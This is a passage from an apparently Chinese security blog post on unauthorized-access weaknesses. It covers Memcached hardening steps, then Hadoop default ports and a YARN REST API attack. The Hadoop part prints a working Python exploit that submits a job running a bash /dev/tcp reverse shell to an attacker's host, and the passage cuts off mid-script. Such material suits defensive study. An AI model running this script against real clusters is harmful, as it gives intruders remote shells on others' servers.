onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBU1dC2pNq7notZfe4wvUkhELudibI06P1AOticYaEInkePmHxkWM8OBvcw/640?wx_fmt=png'" data-type="png" data-w="1988" style=""  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">附赠大佬写的文章&nbsp;</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">Discuz!因Memcached未授权访问导致的RCE<br  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">https://xz.aliyun.com/t/2018</p><hr style="margin-top: 15px;margin-bottom: 15px;border-top: 0px;border-right: 0px;border-left: 0px;border-bottom-style: solid;border-bottom-color: rgb(221, 221, 221);box-sizing: content-box;height: 0px;background: rgb(255, 255, 255);font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;"  /><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>3.防范措施</strong></h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><em>1.限制访问</em><br  />如果memcache没有对外访问的必要，可在memcached启动的时候指定绑定的ip地址为 127.0.0.1。其中 -l 参数指定为本机地址。例如：<br  /></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-attribute" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 59px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">memcached</span> -d -m <span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 27px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">1024</span> -u root -l <span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 59px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">127.0.0.1</span> -p <span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">11211</span> -c <span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">1024</span> -P /tmp/<span style="color: rgb(221, 17, 68);font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;letter-spacing: 0.75px;text-align: start;background-color: rgba(0, 0, 0, 0.04);">memcached.pid</span></code></pre></section><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">或者 vim /etc/sysconfig/memcached，修改配置文件<br  /><em><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;white-space: nowrap;background-color: rgba(0, 0, 0, 0.04);border-width: 1px;border-style: solid;border-color: rgb(225, 225, 232);">OPTIONS="-l 127.0.0.1"</code></em>，只能本机访问，不对公网开放，保存退出 /etc/init.d/memcached reload</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><em>2.防火墙</em></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">// accept
## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 11211 -j ACCEPT
## iptables -A INPUT -p udp -s 127.0.0.1 --dport 11211 -j ACCEPT

// drop
## iptables -I INPUT -p tcp --dport 11211 -j DROP
## iptables -I INPUT -p udp --dport 11211 -j DROP

// 保存规则并重启 iptables
## service iptables save
## service iptables restart</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><em>3.使用最小化权限账号运行Memcached服务</em><br  />使用普通权限账号运行，指定Memcached用户。<br  /></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 59px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">memcached</span> <span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">-d</span> <span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">-m</span> 1024 <span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 14px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">-u</span> <span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 59px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">memcached</span> <span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">-l</span> 127<span class="hljs-default-selector-class" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">.0</span><span class="hljs-default-selector-class" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">.0</span><span class="hljs-default-selector-class" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">.1</span> <span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">-p</span> 11211 <span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">-c</span> 1024 <span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">-P&nbsp;<span style="color: rgb(221, 17, 68);font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;letter-spacing: 0.75px;text-align: start;background-color: rgba(0, 0, 0, 0.04);">/tmp/memcached.pid</span></span></code></pre></section><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><em>4.启用认证功能</em><br  />Memcached本身没有做验证访问模块,Memcached从1.4.3版本开始，能支持SASL认证。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">SASL认证详细配置手册：</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">http://www.postfix.org/SASL_README.html?spm=a2c4g.11186623.2.5.RpKdcX##saslauthd</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><em>5.修改默认端口</em><br  />修改默认11211监听端口为11222端口。在Linux环境中运行以下命令<br  /><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;white-space: nowrap;background-color: rgba(0, 0, 0, 0.04);border-width: 1px;border-style: solid;border-color: rgb(225, 225, 232);"></code></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 59px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">memcached</span> <span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">-d</span> <span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">-m</span> 1024 <span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 14px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">-u</span> <span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 59px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">memcached</span> <span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">-l</span> 127<span class="hljs-default-selector-class" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">.0</span><span class="hljs-default-selector-class" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">.0</span><span class="hljs-default-selector-class" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">.1</span> <span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">-p</span> 11222 <span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">-c</span> 1024 <span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">-P&nbsp;<span style="color: rgb(221, 17, 68);font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;letter-spacing: 0.75px;text-align: start;background-color: rgba(0, 0, 0, 0.04);">/tmp/memcached.pid</span></span></code></pre></section><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><em>6.定期升级</em></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">参考:<br  />http://lzone.de/cheat-sheet/memcached<br  />https://www.secpulse.com/archives/49659.html<br  />https://www.sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/<br  />https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf<br  />http://niiconsulting.com/checkmate/2013/05/memcache-exploit/<br  />https://xz.aliyun.com/t/2018<br  />http://drops.xmd5.com/static/drops/web-8987.html<br  />https://blog.csdn.net/microzone/article/details/79262549</p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">0x07 Hadoop未授权访问</h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的 MapReduce 算法进行分布式处理。这个框架被Adobe，Last fm，EBay，Yahoo等知名公司使用着。它极大地精简化程序员进行分布式计算时所需的操作，用户大概通过如下步骤在hadoop中实现分布式处理：</p><ul style="" class=" list-paddingleft-2"><li><p>用户创建一个处理键值的map函数</p></li><li><p>产生了一套中间键/值</p></li><li><p>reduce函数合并中间值并把他们关联到对应的键</p></li></ul><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>1. 扫描探测</strong></h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>1.1 常见端口</strong><br  /></p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="1.3194154488517744" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/25_L3zoTFIxScjr1hMD1kxoqb3WPg7PHQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUnTYJcEHUSeUfTeibBHEBm45B1L3zoTFIxScjr1hMD1kxoqb3WPg7PHQ/640?wx_fmt=png'" data-type="png" data-w="958" style=""  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>1.2 敏感端口</strong><br  /></p><table width="770" style="width: 556px;"><thead style="box-sizing: border-box;"><tr style="box-sizing: border-box;border-top: 1px solid rgb(204, 204, 204);"><th style="box-sizing: border-box;padding: 6px 13px;border-top-width: 1px;border-top-color: rgb(221, 221, 221);">模块</th><th style="box-sizing: border-box;padding: 6px 13px;border-top-width: 1px;border-top-color: rgb(221, 221, 221);">节点</th><th style="box-sizing: border-box;padding: 6px 13px;border-top-width: 1px;border-top-color: rgb(221, 221, 221);">默认端口</th></tr></thead><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;border-top: 1px solid rgb(204, 204, 204);"><td style="box-sizing: border-box;padding: 6px 13px;">HDFS</td><td style="box-sizing: border-box;padding: 6px 13px;">NameNode</td><td style="box-sizing: border-box;padding: 6px 13px;">50070</td></tr><tr style="box-sizing: border-box;background-color: rgb(248, 248, 248);border-top: 1px solid rgb(204, 204, 204);"><td style="box-sizing: border-box;padding: 6px 13px;">HDFS</td><td style="box-sizing: border-box;padding: 6px 13px;">SecondNameNode</td><td style="box-sizing: border-box;padding: 6px 13px;">50090</td></tr><tr style="box-sizing: border-box;border-top: 1px solid rgb(204, 204, 204);"><td style="box-sizing: border-box;padding: 6px 13px;">HDFS</td><td style="box-sizing: border-box;padding: 6px 13px;">DataNode</td><td style="box-sizing: border-box;padding: 6px 13px;">50075</td></tr><tr style="box-sizing: border-box;background-color: rgb(248, 248, 248);border-top: 1px solid rgb(204, 204, 204);"><td style="box-sizing: border-box;padding: 6px 13px;">HDFS</td><td style="box-sizing: border-box;padding: 6px 13px;">Backup/Checkpoint node</td><td style="box-sizing: border-box;padding: 6px 13px;">50105</td></tr><tr style="box-sizing: border-box;border-top: 1px solid rgb(204, 204, 204);"><td style="box-sizing: border-box;padding: 6px 13px;">MapReduce</td><td style="box-sizing: border-box;padding: 6px 13px;">JobTracker</td><td style="box-sizing: border-box;padding: 6px 13px;">50030</td></tr><tr style="box-sizing: border-box;background-color: rgb(248, 248, 248);border-top: 1px solid rgb(204, 204, 204);"><td style="box-sizing: border-box;padding: 6px 13px;">MapReduce</td><td style="box-sizing: border-box;padding: 6px 13px;">TaskTracker</td><td style="box-sizing: border-box;padding: 6px 13px;">50060</td></tr></tbody></table><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">通过访问 NameNode WebUI 管理界面的 50070 端口，可以下载任意文件。而且，如果 DataNode 的默认端口 50075 开放，攻击者可以通过 HDSF 提供的 restful API 对 HDFS 存储的数据进行操作。</p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.5388888888888889" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/26_XzjJYJe9CsJ37EgRicdiaHWk6z9Mvw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUQcCL2qLngLhMUDNhmTmHVwwUfHXzjJYJe9CsJ37EgRicdiaHWk6z9Mvw/640?wx_fmt=png'" data-type="png" data-w="2880" style=""  /></p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>2. 攻击手法</strong><br  /></h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">利用方法和原理中有一些不同。在没有 hadoop client 的情况下，直接通过&nbsp;REST API&nbsp;也可以提交任务执行。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">利用过程如下：</p><ul style="" class=" list-paddingleft-2"><li><p>在本地监听等待反弹 shell 连接</p></li><li><p>调用 New Application API 创建 Application</p></li><li><p>调用 Submit Application API 提交</p></li></ul><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>P牛的攻击脚本</strong></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">##!/usr/bin/env python

import requests

target = 'http://127.0.0.1:8088/'
lhost = '192.168.0.1' ## put your local host ip here, and listen at port 9999

url = target + 'ws/v1/cluster/apps/new-application'
resp = requests.post(url)
app_id = resp.json()['application-id']
url = target + 'ws/v1/cluster/apps'
data = {
 &nbsp; &nbsp;'application-id': app_id,
 &nbsp; &nbsp;'application-name': 'get-shell',
 &nbsp; &nbsp;'am-container-spec': {
 &nbsp; &nbsp; &nbsp; &nbsp;'commands': {
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;'command': '/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1' % lhost,
 &nbsp; &nbsp; &nbsp; &nbsp;},
 &nbsp; &nbsp;},
 &nbsp; &nbsp;'application-type': 'YARN',
}
